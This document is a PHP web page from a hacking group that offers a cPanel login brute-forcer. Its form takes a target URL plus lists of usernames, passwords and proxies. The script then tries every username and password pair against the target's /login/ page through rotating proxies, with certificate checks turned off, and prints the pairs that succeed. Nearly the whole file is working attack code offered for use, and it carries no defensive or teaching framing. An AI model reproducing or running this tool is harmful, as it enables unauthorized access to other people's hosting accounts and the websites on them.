<html>
<title> Iedb Cpanel Cracker</title>
<body bgcolor="black">
<font color="white">
<?php  echo "<center>"."<font color=red face=Arial size=5px>"."http://iedb.ir/acc"."</font>"."</center>"."</br>"; ?>
<link rel="shortcut icon" type="image/x-icon" href="http://uploadtak.com/images/v6116_favicon.ico">
<center><font color="yellow" size="+2"><b> Iedb Cpanel Bruter  By <font color="red">S!Y0U.T4r.6T </font> 
<br>Iedb.ir/acc -- Iedb.ir/<br></font></center>
<form action="" method="post">
Target<input type="text" name="target" size="30"/></br> 
<textarea name="user" cols="15" rows="30">Username</textarea>
<textarea name="pass" cols="15" rows="30">Password</textarea>
<textarea name="proxy" cols="15" rows="30"></textarea></br>
<input type="submit" name="dokme" value="Crack"/>
</form>
</body>
</html>
<?php 

ob_start(); 
ini_set('max_execution_time', '6000');

$dokme= $_REQUEST['dokme'];
$user= $_REQUEST['user'];
$pass = $_REQUEST['pass'];
$user_list=explode("\n",$user);
$pass_list=explode("\n",$pass);
 
function strinstr($find, $str) {

	if (preg_match('~'.preg_quote($find).'~',$str)) {
		return true;
	}
	return false;
 }


    
 

	function crack($postVars) { static $x=0;

    $proxy = $_REQUEST['pass'];$proxy_list=explode("\n",$pass);
 
    $target= $_REQUEST['target'];
    
    $curl = curl_init(); 
    curl_setopt($curl,CURLOPT_RETURNTRANSFER,1); 
    curl_setopt($curl,CURLOPT_URL,trim($target).'/login/'); 
    curl_setopt($curl,CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie33.txt'); 
    curl_setopt($curl,CURLOPT_COOKIEFILE,dirname(__FILE__) . '/cookie33.txt'); 
    curl_setopt($curl,CURLOPT_SSL_VERIFYPEER, FALSE); 
    curl_setopt($curl,CURLOPT_HTTPPROXYTUNNEL, true);
    curl_setopt($curl,CURLOPT_PROXY,$proxy_list[$x]); 
    curl_setopt($curl,CURLOPT_TIMEOUT, 60); 
    curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1); 
    curl_setopt($curl,CURLOPT_POST,TRUE); 
    curl_setopt($curl,CURLOPT_POSTFIELDS,$postVars); 
    $a = curl_exec($curl); 

 if($a==false) {  $x++;   crack($postVars);   }
    return $a;
curl_close($curl);

}

if(isset($dokme)) {

for($j=0;$j<count($pass_list);$j++) {

for($i=0;$i<count($user_list);$i++) {

 
$post=array("user"=>trim($user_list[$i]),"pass"=>trim($pass_list[$j]));
 ob_flush(); flush();	

 $b=crack($post);

if (!strinstr("invalid", $b)) {

     echo "<font color=red face=Arial size=5px>"."USER: ".$user_list[$i]." PASS: ".$pass_list[$j]." IS OK"."</font>"."</br>";
           $file=fopen(dirname(__FILE__) . '/cookie33.txt','w');
      fwrite($file,"");  
      fclose($file);
     
}
 if (strinstr("invalid", $b)) {

     echo "</br>";
           $file=fopen('checked.txt','w');
      fwrite($file,"User: ".$user_list[$i]." Pass: ".$pass_list[$j]." Is CHEACKED".PHP_EOL."\n");  
      fclose($file);
     
}
  

  }
}
 
}

 echo "<center>"."Tnx:Amir--Behnam.Vanda--TaK.FaNaR--Medrik--BlackM4n--r3d_s0urc3"."</center>"."</br>";
 echo "<center>"."Yahoo id:Boshrast71"."</center>"."</br>";
?>